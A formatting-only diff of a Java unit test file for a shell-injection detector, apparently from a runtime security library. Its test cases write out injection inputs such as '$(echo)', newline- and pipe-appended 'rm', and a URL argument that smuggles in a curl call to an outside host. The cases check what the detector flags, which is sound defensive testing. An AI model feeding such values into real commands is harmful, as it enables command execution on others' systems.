@@ -10,12 +10,12 @@ public class ShellInjectionDetectorTest {
 
     private void assertIsShellInjection(String command, String userInput) {
         assertTrue(new ShellInjectionDetector().run(userInput, new String[]{command}).isDetectedAttack(),
-                String.format("command: %s, userInput: %s", command, userInput));
+            String.format("command: %s, userInput: %s", command, userInput));
     }
 
     private void assertIsNotShellInjection(String command, String userInput) {
         assertFalse(new ShellInjectionDetector().run(userInput, new String[]{command}).isDetectedAttack(),
-                String.format("command: %s, userInput: %s", command, userInput));
+            String.format("command: %s, userInput: %s", command, userInput));
     }
 
     @Test
@@ -56,11 +56,11 @@ public class ShellInjectionDetectorTest {
         assertIsShellInjection("ls $(echo)", "$(echo)");
         assertIsShellInjection("ls \"$(echo)\"", "$(echo)");
         assertIsShellInjection("echo $(echo \"Inner: $(echo \"This is nested\")\")",
-                "$(echo \"Inner: $(echo \"This is nested\")\")");
+            "$(echo \"Inner: $(echo \"This is nested\")\")");
 
         assertIsNotShellInjection("ls '$(echo)'", "$(echo)");
         assertIsNotShellInjection("ls '$(echo \"Inner: $(echo \"This is nested\")\")'",
-                "$(echo \"Inner: $(echo \"This is nested\")\")");
+            "$(echo \"Inner: $(echo \"This is nested\")\")");
     }
 
     @Test
@@ -282,6 +282,7 @@ public class ShellInjectionDetectorTest {
     void testConsidersSpacesInEnvironmentVariableAssignmentsAsSafe() {
         assertIsNotShellInjection("ENV_VAR='value' command", " "); // Spaces around environment variable assignments are not injections
     }
+
     @Test
     void testNewLinesInCommandsAreConsideredInjections() {
         assertIsShellInjection("ls \nrm", "\nrm");
@@ -322,6 +323,7 @@ public class ShellInjectionDetectorTest {
         assertIsShellInjection("find /path/to/search -type f -name \"pattern\" -exec rm {} \\;", "rm");
         assertIsShellInjection("ls .|rm", "rm");
     }
+
     @Test
     void testIgnoresDangerousCommandsIfPartOfString() {
         assertIsNotShellInjection("binary sleepwithme", "sleepwithme");
@@ -398,15 +400,16 @@ public class ShellInjectionDetectorTest {
     @Test
     void testRealCase() {
         assertIsShellInjection(
-                "command -disable-update-check -target https://examplx.com|curl+https://cde-123.abc.domain.com+%23 -json-export /tmp/5891/8526757.json -tags microsoft,windows,exchange,iis,gitlab,oracle,cisco,joomla -stats -stats-interval 3 -retries 3 -no-stdin",
-                "https://examplx.com|curl+https://cde-123.abc.domain.com+%23"
+            "command -disable-update-check -target https://examplx.com|curl+https://cde-123.abc.domain.com+%23 -json-export /tmp/5891/8526757.json -tags microsoft,windows,exchange,iis,gitlab,oracle,cisco,joomla -stats -stats-interval 3 -retries 3 -no-stdin",
+            "https://examplx.com|curl+https://cde-123.abc.domain.com+%23"
         );
     }
+
     @Test
     void testFalsePositiveWithEmail() {
         assertIsNotShellInjection(
-                "echo token | docker login --username john.doe@acme.com --password-stdin hub.acme.com",
-                "john.doe@acme.com"
+            "echo token | docker login --username john.doe@acme.com --password-stdin hub.acme.com",
+            "john.doe@acme.com"
         );
     }
 
@@ -419,19 +422,19 @@ public class ShellInjectionDetectorTest {
     @Test
     void testAllowsCommaSeparatedList() {
         assertIsNotShellInjection(
-                "command -tags php,laravel,drupal,phpmyadmin,symfony -stats",
-                "php,laravel,drupal,phpmyadmin,symfony"
+            "command -tags php,laravel,drupal,phpmyadmin,symfony -stats",
+            "php,laravel,drupal,phpmyadmin,symfony"
         );
     }
 
     @Test
     void testItFlagsCommaInLoop() {
         assertIsShellInjection(
-                "command for (( i=0, j=10; i<j; i++, j-- ))\n" +
-                        "do\n" +
-                        "    echo \"$i $j\"\n" +
-                        "done",
-                "for (( i=0, j=10; i<j; i++, j-- ))"
+            "command for (( i=0, j=10; i<j; i++, j-- ))\n" +
+                "do\n" +
+                "    echo \"$i $j\"\n" +
+                "done",
+            "for (( i=0, j=10; i<j; i++, j-- ))"
         );
     }
 }
